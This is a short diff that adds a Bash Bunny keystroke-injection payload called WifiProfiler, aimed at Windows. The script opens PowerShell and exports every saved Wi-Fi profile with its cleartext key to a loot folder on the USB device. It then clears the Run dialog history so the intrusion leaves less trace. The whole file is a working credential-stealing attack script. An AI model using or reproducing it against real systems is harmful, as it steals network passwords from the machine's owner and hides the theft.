@@ -1,0 +1,36 @@
+#!/bin/bash
+#Name: WifiProfiler
+#Scripter: Ryan_Van_Mass
+#Description: Collect all Wifi Profiles saved on a system included there password
+#Target: Windows
+
+############## Setup ############## 
+LED SETUP 
+ATTACKMODE HID STORAGE
+
+#Make loot Directory
+mkdir -p /root/udisk/loot/WifiProfiler
+
+############## Attack ##############
+LED ATTACK
+sleep 5
+
+#Opens Powershell
+RUN WIN 'powershell'
+
+# Collects Profiles
+sleep 3
+QUACK STRING 'netsh wlan export profile key=clear; $Bunny = (Get-Volume -FileSystemLabel BashBunny).DriveLetter + ":\loot\WifiProfiler\"; mv *.xml* $Bunny'
+QUACK ENTER
+sleep 5
+
+############## Clean Up ############## 
+QUACK STRING "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "exit"
+QUACK ENTER
+
+
+############## FINISHED ############## 
+LED SUCCESS
